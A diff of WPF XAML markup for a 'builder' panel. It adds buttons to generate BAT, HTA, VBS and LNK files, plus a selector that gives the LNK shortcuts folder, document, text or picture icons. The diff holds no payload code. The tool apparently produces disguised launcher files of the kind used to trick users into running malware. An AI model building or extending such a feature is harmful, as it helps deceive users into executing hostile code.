@@ -1704,17 +1704,17 @@
                                                         Padding="12,10"
                                                         FontSize="12"/>
                                                 <Button Grid.Column="2"
-                                                        x:Name="builderGenerateVbsButton"
-                                                        Content="Generate VBS"
-                                                        Click="GenerateVbsButton_Click"
+                                                        x:Name="builderGenerateBatButton"
+                                                        Content="Generate BAT"
+                                                        Click="GenerateBatButton_Click"
                                                         Style="{StaticResource OutlineButton}"
                                                         HorizontalAlignment="Stretch"
                                                         Padding="12,10"
                                                         FontSize="12"/>
                                                 <Button Grid.Column="4"
-                                                        x:Name="builderGenerateBatButton"
-                                                        Content="Generate BAT"
-                                                        Click="GenerateBatButton_Click"
+                                                        x:Name="builderGenerateHtaButton"
+                                                        Content="Generate HTA"
+                                                        Click="GenerateHtaButton_Click"
                                                         Style="{StaticResource OutlineButton}"
                                                         HorizontalAlignment="Stretch"
                                                         Padding="12,10"
@@ -1726,6 +1726,51 @@
                                                         HorizontalAlignment="Stretch"
                                                         Padding="12,10"
                                                         FontSize="12"/>
+                                            </Grid>
+                                            <Grid Margin="0,6,0,0">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*"/>
+                                                    <ColumnDefinition Width="6"/>
+                                                    <ColumnDefinition Width="*"/>
+                                                </Grid.ColumnDefinitions>
+                                                <Button Grid.Column="0"
+                                                        x:Name="builderGenerateVbsButton"
+                                                        Content="Generate VBS"
+                                                        Click="GenerateVbsButton_Click"
+                                                        Style="{StaticResource OutlineButton}"
+                                                        HorizontalAlignment="Stretch"
+                                                        Padding="12,10"
+                                                        FontSize="12"/>
+                                                <Button Grid.Column="2"
+                                                        x:Name="builderGenerateLnkButton"
+                                                        Content="Generate LNK"
+                                                        Click="GenerateLnkButton_Click"
+                                                        Style="{StaticResource OutlineButton}"
+                                                        HorizontalAlignment="Stretch"
+                                                        Padding="12,10"
+                                                        FontSize="12"/>
+                                            </Grid>
+                                            <Grid Margin="0,6,0,0">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="Auto"/>
+                                                    <ColumnDefinition Width="8"/>
+                                                    <ColumnDefinition Width="*"/>
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0"
+                                                           Text="LNK ICON"
+                                                           VerticalAlignment="Center"
+                                                           Foreground="{DynamicResource TextSecondaryBrush}"
+                                                           FontWeight="SemiBold"
+                                                           FontSize="11"/>
+                                                <ComboBox Grid.Column="2"
+                                                          x:Name="lnkIconComboBox"
+                                                          SelectedIndex="0">
+                                                    <ComboBoxItem Tag="imageres.dll,3" Content="Folder"/>
+                                                    <ComboBoxItem Tag="shell32.dll,1" Content="Document"/>
+                                                    <ComboBoxItem Tag="imageres.dll,2" Content="Text"/>
+                                                    <ComboBoxItem Tag="imageres.dll,108" Content="Picture"/>
+                                                    <ComboBoxItem Tag="shell32.dll,15" Content="Settings"/>
+                                                </ComboBox>
                                             </Grid>
                                         </StackPanel>
                                     </StackPanel>
